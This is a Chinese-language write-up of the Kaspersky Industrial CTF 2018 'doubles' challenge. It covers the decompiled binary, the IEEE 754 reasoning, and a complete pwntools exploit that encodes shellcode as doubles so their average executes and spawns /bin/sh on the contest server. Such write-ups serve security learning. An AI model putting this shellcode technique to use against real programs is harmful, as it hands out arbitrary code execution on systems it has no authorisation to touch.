Kaspersky Industrial CTF 2018 writeup - doubles
===

### 觀察
一如往常的起手式 F5 後，迅速發現這又是個有趣的 shellcode 練習題，把 code 整理一下
```cpp
void f()
{
  double *buf; 
  int v1; 
  unsigned int i; 
  double input_cnt; 
  double total; 

  alarm(0xAu);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  buf = (double *)mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);
  if ( !buf )
  {
    fwrite("something is wrong, tell admin\n", 0x1FuLL, 1uLL, stderr);
    _exit(1);
  }
  fwrite("n: ", 3uLL, 1uLL, stdout);
  v1 = __isoc99_scanf("%u", &input_cnt);
  _IO_getc(stdin);
  if ( v1 != 1 )
    _exit(2);
  if ( input_cnt < 7 )
  {
    if ( !input_cnt )
    {
      total = 0.0;
      input_cnt = 0.0;
      goto LABEL_10;
    }
  }
  else
  {
    input_cnt = 6;
  }
  total = 0.0;
  i = 0;
  for (int i = 0; i < input_cnt; i++) {
    scanf("%lf", &buf[i]);
    _IO_getc(stdin);
    total += buf[i];
  }
LABEL_10:
  buf[14] = -6.828527034440643e-229; // 0x909090909090C031 = xor eax, eax nop nop nop nop nop nop
  buf[15] = total / input_cnt;
  JUMPOUT(__CS__, buf + 14); // jmp &buf[14]
}
```
不難看出題目可以讓使用者輸入 n 個 double，其中 0 <= n < 7，將所有輸入的 double 取平均後放到 buf[15]，接著 `jmp &buf[14]` 執行預寫好的 shellcode 和剛剛的平均數... 

### 想法
這題一眼看上去似乎很難操作，最主要的困難是 -- 該怎麼控制輸入的 double 讓他們在被取平均後仍然是一段可以執行的 shellcode，畢竟浮點數常常會出現做完除法後不精確或是輸入時就出現誤差的情況發生，其次是要怎麼在 8 byte 內完成一個 shell。

第二個問題比較容易，做法是想辦法跳回前面輸入的 buffer 上就有最多 6*8 byte 可以使用，而第一個問題卡了我一個小時，直到我赫然發現我可以簡單的確保那些輸入的 double 不會在操作時壞掉，為此必須先了解 IEEE 754 的規範。

以下取自 wiki [IEEE 754](https://zh.wikipedia.org/wiki/IEEE_754)

![](https://i.imgur.com/Qq6La1b.png)

再來下面是從 IEEE 754 格式轉換成小數的方式

<img src="https://latex.codecogs.com/gif.latex?Value%20%3D%20sign%20%5Ctimes%202%5E%7Bexponent-1023%7D%20%5Ctimes%201.fraction" />

有一個很直覺的想法是，如果可以保證我們在操作 double 時就像是在操作 integer，那題目就會被轉換成一個小學數學問題，那要怎麼做呢?
我想到的方法是讓每個輸入的 double 的 exponent 位都是 1023+52 = 1075，因為這樣會使得 <img src="https://latex.codecogs.com/gif.latex?2%5E%7Bexponent-1023%7D%20%5Ctimes%201.fraction" /> 中小數點會被向右位移 52 次，也就是這樣做可以保證每個產出的 double 小數點下都為 0 
(<img src="https://latex.codecogs.com/gif.latex?fraction" /> 只有 52 位長)。實作的方式就是設定每個 double 的最高位和第二高位依序為`\x43`跟`\x30`，這樣就可以開始 exploit 了。

### Exploitation

exploit 的方式是在輸入時寫入五個包含 shellcode 的 double，彼此之間利用 jmp 跳過 `\x30\x43`，接著用數學計算第六個 double 讓最後的平均值等於所需要的 shellcode 即可。

聽起來很容易，不過實際上限制不少，為了確保每個 double 都是以整數運算以及必要的 jmp 指令，再扣掉最後一個調整用的 double，可使用的 shellcode 空間只有 (8-2-2)*(6+1-1) = 24byte，同時每個指令的大小不能超過 4byte，不過就算限制如此嚴峻，我還是強擠了一個能用的 shellcode 出來XD 
(當然是各種嘗試失敗之後)
```python
#!/usr/bin/env python2
from pwn import *
import struct

r = remote('doubles.2018.ctf.kaspersky.com', 10001)

context.arch = 'amd64'

# \x30\x43 here is to make the exponent of double equal (1023 + 52)
# also, 52 is used to ensure every double equal to some integer

# adjust rsp to bss
sc1 = asm('mov sp, 0x601f') + '\xeb\x82' + '\x30\x43'


# read(0, rsp, 0x42) => (rax == 0x42) => xor ah, 0x01 => (rax == 0x142) => execveat(0, rsp, NULL, NULL, 0)
sc2 = asm('''
    shl rsp, 8
    jmp A
    nop
    nop
    A:
    push 0x42
    pop rdx
    nop
    jmp B
    nop
    nop
    B:
    mov rsi, rsp
    nop
    jmp C
    nop
    nop
    C:
    syscall
    xor edx, edx
    jmp D
    nop
    nop
    D:
    xor ah, 0x01
    syscall
    pop rax
    nop
    nop
''')

print repr(sc1)
print disasm(sc1)
print repr(sc2)
print disasm(sc2)

sc2 = sc2.replace('\x90\x90','\x30\x43')

total = 0.0
d = 0.0
ans = []

for i in range(len(sc2)/8):
    d = struct.unpack('d', sc2[i*8:(i+1)*8])[0]
    ans.append(format(d, '.5f'))
    total += d

# calc 6th double to adjust mean to sc1
d = struct.unpack('d', sc1)[0]
ans.append(format(d*6 - total, '.5f'))

r.sendlineafter('n: ', '6')
for s in ans:
    r.sendline(s)

r.send('/bin/sh'.ljust(0x42, '\x00'))
r.interactive()
```
